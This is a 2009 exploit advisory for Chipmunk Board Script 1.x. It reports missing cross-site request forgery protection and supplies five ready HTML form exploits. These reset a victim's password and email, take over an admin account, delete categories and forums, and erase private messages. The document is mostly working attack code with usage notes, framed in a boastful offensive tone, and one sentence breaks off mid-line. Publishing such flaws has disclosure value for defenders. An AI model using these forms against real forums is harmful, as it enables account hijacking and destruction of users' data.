Chipmunk Board Script 1.x Multiple XSRF Vulnerabilities
=======================================================

[-------------------------------------------------------------------------------------------------]
[   Title: Chipmunk Board Script 1.x Multiple XSRF Vulnerabilities                                ]
[   Author: Milos Zivanovic                                                                       ]
[   Date: 11. December 2009.                                                                      ]
[-------------------------------------------------------------------------------------------------]
 
[-------------------------------------------------------------------------------------------------]
[   Application: Chipmunk Board Script                                                            ]
[   Version: 1.X                                                                                  ]
[   Download: http://www.chipmunk-scripts.com/chipmunkcms/chipmunkcms.zip                         ]
[   Vulnerability: Cross Site Request Forgery                                                     ]
[-------------------------------------------------------------------------------------------------]
 
I installed this board script locally and started looking, it didn&#039;t take much to notice first
vulnerability. I found many vulnerabilities that could be exploited via cross site request forgery
method, but i&#039;m only going to show you more important ones.
 
This board script doesn&#039;t have any XSRF protection thus allowing us to do many things we shouldn&#039;t
:)
 
[#]Content
 |--Change user settings (usercp)
 |--Change user settings (admincp)
 |--Delete category
 |--Delete forum
 |--Delete read private messages
 
Every exploit that has
 
[*]Change user settings (usercp)
 
This exploit will change this info for every user that opens it and is logged in.
 
[EXPLOIT------------------------------------------------------------------------------------------]
<form action="http://localhost/cboard/usercp.php" method="POST">
  <input type=&#039;hidden&#039; name=&#039;username&#039; value=&#039;&#039;>
  <input type=&#039;password&#039; name=&#039;password&#039; value=&#039;hacked&#039;>
  <input type=&#039;password&#039; name=&#039;password2&#039; value=&#039;hacked&#039;>
  <input type=&#039;hidden&#039; name=&#039;usepm&#039; value=&#039;1&#039;>
  <input type=&#039;text&#039; name=&#039;email&#039; value=&#039;email@mail.com<mailto:email@mail.com>&#039;>
  <input type=&#039;text&#039; name=&#039;location&#039; value=&#039;Moon&#039;>
  <input type=&#039;text&#039; name=&#039;aim&#039; value=&#039;AIM:...&#039;>
  <input type=&#039;text&#039; name=&#039;icq&#039; value=&#039;ICQ:...&#039;>
  <input type=&#039;hidden&#039; name=&#039;showprofile&#039; value=&#039;1&#039;>
  <input type=&#039;hidden&#039; name=&#039;avatar&#039; value=&#039;&#039;>
  <input type=&#039;hidden&#039; name=&#039;forumtemplate&#039; value=&#039;1&#039;>
  <textarea name=&#039;signature&#039;>Free your mind and the ass will follow.</textarea>
  <input type=&#039;submit&#039; name=&#039;submit&#039; value=&#039;change details&#039;>
</form>
 
[EXPLOIT------------------------------------------------------------------------------------------]
 
[*]Change user settings (admincp)
 
Note: Change [ID] to the id of the forum admin.
(you can view that by viewing his profile on the forum, usually 1-2)
Admins must run this exploit.
 
[EXPLOIT------------------------------------------------------------------------------------------]
<form action="http://localhost/cboard/admin/edituser.php" method="POST">
  <input type=&#039;hidden&#039; name=&#039;userid&#039; value=&#039;[ID]&#039;>
  <input type=&#039;text&#039; name=&#039;username&#039; value=&#039;admin&#039;>
  <input type=&#039;password&#039; name=&#039;password&#039; value=&#039;hacked&#039;>
  <input type=&#039;hidden&#039; name=&#039;userstatus&#039; value=&#039;4&#039;>
  <input type=&#039;text&#039; name=&#039;email&#039; value=&#039;email@mail.com<mailto:email@mail.com>&#039;>
  <input type=&#039;text&#039; name=&#039;rank&#039; value=&#039;0&#039;>
  <input type=&#039;hidden&#039; name=&#039;isbanned&#039; value=&#039;No&#039;>
  <textarea name=&#039;sig&#039;>this is my signature</textarea>
  <input type=&#039;submit&#039; name=&#039;submit&#039; value=&#039;Edit This user&#039;>
</form>
 
[EXPLOIT------------------------------------------------------------------------------------------]
 
[-]Delete category
 
Note: Change [ID] to the id of the category you want to delete.
Admins must run this exploit.
 
[EXPLOIT------------------------------------------------------------------------------------------]
<form action="http://localhost/cboard/admin/deletecat.php?categoryid=[ID]" method="POST">
  <input type=&#039;hidden&#039; name=&#039;catid&#039; value=&#039;[ID]&#039;>
  <input type=&#039;submit&#039; name=&#039;submit&#039; value=&#039;Delete This Forum&#039;>
</form>
 
[EXPLOIT------------------------------------------------------------------------------------------]
 
[-]Delete forum
 
Note: Change [ID] to the id of the forum you want to delete.
Admins must run this exploit.
 
[EXPLOIT------------------------------------------------------------------------------------------]
<form action="http://localhost/cboard/admin/deleteforum.php?ID=[ID]" method="POST">
  <input type=&#039;hidden&#039; name=&#039;ID&#039; value=&#039;[ID]&#039;>
  <input type=&#039;submit&#039; name=&#039;submit&#039; value=&#039;Delete This Forum&#039;>
</form>
 
[EXPLOIT------------------------------------------------------------------------------------------]
 
[-]Delete read private messages
 
This exploit will delete read private messages for every user that opens it and is logged in.
 
[EXPLOIT------------------------------------------------------------------------------------------]
<form action="http://localhost/cboard/pm/deleteread.php" method="POST">
  <input type=&#039;submit&#039; name=&#039;submit&#039; value=&#039;delete&#039;>
</form>



